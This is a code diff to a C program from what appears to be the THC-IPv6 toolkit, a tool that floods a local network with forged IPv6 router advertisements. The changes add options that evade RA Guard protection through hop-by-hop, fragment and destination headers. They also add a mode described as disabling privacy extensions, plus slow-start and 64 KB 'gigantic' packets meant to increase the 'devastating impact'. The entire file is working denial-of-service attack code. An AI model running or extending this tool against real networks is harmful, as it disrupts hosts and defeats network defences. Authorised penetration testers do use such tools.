@@ -10,37 +10,41 @@
 #include <pcap.h>
 #include "thc-ipv6.h"
 
-#define ENTRIES 17
-
 void help(char *prg) {
   printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s [-HFD] [-s] [-RPA] interface\n\n", prg);
+  printf("Syntax: %s [-HFD] [-sSG] [-RPA] interface [target]\n\n", prg);
   printf("Flood the local network with router advertisements.\n");
-  printf("Each packet contains %d prefix and route enries\n", ENTRIES);
-  printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard security.\n");
-  printf("-R does only send routing entries, no prefix information.\n");
-  printf("-P does only send prefix information, no routing entries.\n");
-  printf("-A is like -P but implements an attack by George Kargiotakis to disable privacy extensions\n");
-  printf("The option -s uses small lifetimes, resulting in a more devasting impact\n");
-//  printf("Use -r to use raw mode.\n\n");
+  printf("Each packet contains ~25 prefix and route enries\n");
+  printf("Modes:\n");
+  printf("  default  sends both routing entries and prefix information\n");
+  printf("  -R       does only send routing entries, no prefix information\n");
+  printf("  -P       does only send prefix information, no routing entries\n");
+  printf("  -A       an attack to disable privacy extensions\n");
+  printf("Options:\n");
+  printf("  -H       add a hopbyhop header to bypass RA guard security\n");
+  printf("  -F       add an atomic fragment header to bypass RA guard security\n");
+  printf("  -D       add a large destination header to bypass RA guard security\n");
+  printf("  -s       use small lifetimes, resulting in a more devasting impact\n");
+  printf("  -S       performs a slow start, which can increases the impact\n");
+  printf("  -G       gigantic packet of 64kb of prefix/route entries\n");
   exit(-1);
 }
 
 int main(int argc, char *argv[]) {
   char *interface, mac[6] = "";
   unsigned char *mac6 = mac, *ip6;
-  unsigned char buf[1460], buf2[6], buf3[1504];
+  unsigned char *buf, buf2[6], buf3[1504];
   unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
   int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
   unsigned char *pkt = NULL;
-  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_hop = 0, do_frag = 0, do_dst = 0;
-  int cnt = ENTRIES, until = 0, lifetime = 0x00ff0100, mfoo;
+  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1;
+  int cnt, until = 0, lifetime = 0x00ff0100, mfoo, slow = 0;
   thc_ipv6_hdr *hdr = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHRPArs")) >= 0) {
+  while ((i = getopt(argc, argv, "DFHRPArsSG")) >= 0) {
     switch (i) {
     case 'r':
       thc_ipv6_rawmode(1);
@@ -48,6 +52,12 @@ int main(int argc, char *argv[]) {
       break;
     case 's':
       lifetime = 0x03000000;
+      break;
+    case 'S':
+      slow = 16;
+      break;
+    case 'G':
+      bsize = 65488;
       break;
     case 'A':
       deanon = 1;
@@ -66,16 +76,48 @@ int main(int argc, char *argv[]) {
       break;
     case 'R':
       route_only = 1;
-      cnt += ENTRIES;
       break;
     case 'P':
       prefix_only = 1;
-      cnt += ENTRIES;
       break;
     default:
       fprintf(stderr, "Error: invalid option %c\n", i);
       exit(-1);
     }
+  }
+  
+  if (prefix_only && route_only) {
+    fprintf(stderr, "Error: -P/-A and -R can not be specified together!\n");
+    exit(-1);
+  }
+  
+  if (bsize == -1) {
+    bsize = thc_get_mtu(argv[optind]) - 40;
+    if (bsize < 1240 || bsize > 1460) {
+      fprintf(stderr, "Error: invalid MTU on interface %s: %d\n", argv[optind], thc_get_mtu(argv[optind]));
+      exit(-1);
+    }
+  }
+  
+  if (argc - optind > 1)
+    if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
+      fprintf(stderr, "Error: invalid target %s\n", argv[optind + 1]);
+      exit(-1);
+    }
+
+  if ((buf = malloc(bsize)) == NULL) {
+    fprintf(stderr, "Error: malloc() failed\n");
+    exit(-1);
+  }
+
+  if (deanon == 0) {
+    i = 0;
+    if (prefix_only == 0)
+      i += 24;
+    if (route_only == 0)
+      i += 32;
+//printf("i %d  route %d prefix %d\n", i, prefix_only, route_only);
+    cnt = (bsize - 32 - (do_hop + do_dst + do_frag) * 8) / i;
   }
 
   if (argc - optind < 1)
@@ -85,6 +127,10 @@ int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
 
   interface = argv[optind];
+  if (thc_get_own_mac(interface) == NULL) {
+    fprintf(stderr, "Error: invalid interface %s\n", interface);
+    exit(-1);
+  }
   mtu = 1500;
   size = 64;
   k = rand();
@@ -101,7 +147,7 @@ int main(int argc, char *argv[]) {
 
   memset(buf2, 0, sizeof(buf2));
   memset(buf3, 0, sizeof(buf3));
-  memset(buf, 0, sizeof(buf));
+  memset(buf, 0, bsize);
   buf[1] = 250;
   buf[5] = 30;
   buf[8] = 5; // mtu
@@ -121,8 +167,8 @@ int main(int argc, char *argv[]) {
       buf[j+1] = 4;
       buf[j+2] = size;
       buf[j+3] = 128 + 64 + 32;
-      memcpy(buf + j + 4, (char*) &lifetime, 4);
-      memcpy(buf + j + 8, (char*) &lifetime, 4);
+      memcpy(buf + j + 4, (char*) &lifetime + _TAKE4, 4);
+      memcpy(buf + j + 8, (char*) &lifetime + _TAKE4, 4);
 //      buf[j+5] = 2;
 //      buf[j+9] = 1;
 //      memset(&buf[j+16], 255, 8);
@@ -145,7 +191,7 @@ int main(int argc, char *argv[]) {
       buf[j+1] = 3;
       buf[j+2] = size;
       buf[j+3] = 8;
-      memcpy(buf + j + 4, (char*)&lifetime, 4);
+      memcpy(buf + j + 4, (char*) &lifetime + _TAKE4, 4);
 //      buf[j+5] = 1; // 4-7 lifetime
 //      memset(&buf[j+8], 255, 8);
       buf[j+8] = 32;
@@ -157,24 +203,27 @@ int main(int argc, char *argv[]) {
     }
   }
   
-  printf("Starting to flood network with router advertisements on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
+//printf("DBG: %d entries of %s %s\n", cnt, route_only == 0 ? "prefix" : "", prefix_only == 0 ? "route" : "");
+//printf("j is %d, bsize %d\n", j, bsize);
+  printf("Starting to flood network with router advertisements on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
   while (until != 1) {
-    memcpy(&buf[20], (char*)&k, 4);
-    memcpy(ip6 + 11, (char*)&k, 4);
+    memcpy(&buf[20], (char*)&k + _TAKE4, 4);
+    memcpy(ip6 + 11, (char*)&k + _TAKE4, 4);
     k++;
     for (i = 0; i < cnt; i++) {
       if (route_only == 0)
-        memcpy(&buf[24 + 20 + i*32], (char*)&k, 4);
+        memcpy(&buf[24 + 20 + i*32], (char*)&k + _TAKE4, 4);
       k++;
-      if (prefix_only == 0)
+      if (prefix_only == 0) {
         if (route_only == 0)
-          memcpy(&buf[24 + 12 + i*24 + cnt*32], (char*)&k, 4);
+          memcpy(&buf[24 + 12 + i*24 + cnt*32], (char*)&k + _TAKE4, 4);
         else
-          memcpy(&buf[24 + 12 + i*24], (char*)&k, 4);
+          memcpy(&buf[24 + 12 + i*24], (char*)&k + _TAKE4, 4);
+      }
       k++;
     }
     count++;
-    if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
+    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
       return -1;
     if (do_hop) {
       type = NXT_HBH;
@@ -200,7 +249,7 @@ int main(int argc, char *argv[]) {
       mfoo = 0xff080003;
     if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, mfoo, buf, j, 0) < 0)
       return -1;
-    if (do_dst) {
+    if (do_dst || bsize + 40 > thc_get_mtu(interface)) {
       thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
       hdr = (thc_ipv6_hdr *) pkt;
       thc_send_as_fragment6(interface, ip6, dst, type, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 1240);
@@ -212,7 +261,12 @@ int main(int argc, char *argv[]) {
 
     pkt = thc_destroy_packet(pkt);
 //    usleep(1);
-    if (count % 100 == 0)
+    if (slow > 0) {
+      printf("slow ");
+      sleep(slow / 2);
+      slow--;
+    }
+    if (count % 1000 == 0)
       printf(".");
     if (until > 1)
       until--;
